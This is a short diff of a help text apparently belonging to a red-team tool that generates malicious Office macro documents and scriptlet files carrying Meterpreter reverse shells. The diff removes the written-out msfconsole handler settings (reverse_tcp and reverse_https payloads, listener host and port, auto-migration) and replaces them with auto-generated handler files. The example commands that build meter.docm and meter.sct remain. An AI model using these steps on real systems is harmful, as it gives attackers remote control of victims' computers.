@@ -78,17 +78,8 @@ r"""
         Give this template the IP and PORT of listening mfsconsole
          -> Example: echo <ip> <port> | %s -t METERPRETER -o -G meter.docm
 
-        Recommended msfconsole options (use exploit/multi/handler):
-        set PAYLOAD windows/meterpreter/reverse_tcp (32 bit)
-        set PAYLOAD windows/x64/meterpreter/reverse_tcp (64 bit
-        set LHOST 0.0.0.0
-        sel LPORT <port>
-        set AutoRunScript post/windows/manage/migrate
-        set EXITFUNC thread
-        set EnableUnicodeEncoding true
-        set EnableStageEncoding true
-        set ExitOnSession false
-        exploit -j
+        This template also generates a  meterpreter.rc file to create the Metasploit handler
+          -> Example: msfconsole -r meterpreter.rc
 
                         --------------------
 
@@ -98,17 +89,8 @@ r"""
         Give this template the IP and PORT of listening mfsconsole
          -> Example: echo <ip> 443 | %s -t WEBMETER -o -G meter.sct
 
-        Recommended msfconsole options (use exploit/multi/handler):
-        set PAYLOAD windows/meterpreter/reverse_https (32 bit)
-        set PAYLOAD windows/x64/meterpreter/reverse_https (64 bit
-        set LHOST <attacker ip, cannot be 0.0.0.0>
-        set LPORT <port>
-        set AutoRunScript post/windows/manage/migrate
-        set EXITFUNC thread
-        set EnableUnicodeEncoding true
-        set EnableStageEncoding true
-        set ExitOnSession false
-        exploit -j
+        This template also generates a  webmeter.rc file to create the Metasploit handler
+         -> Example: msfconsole -r webmeter.rc
 
                 --------------------
 
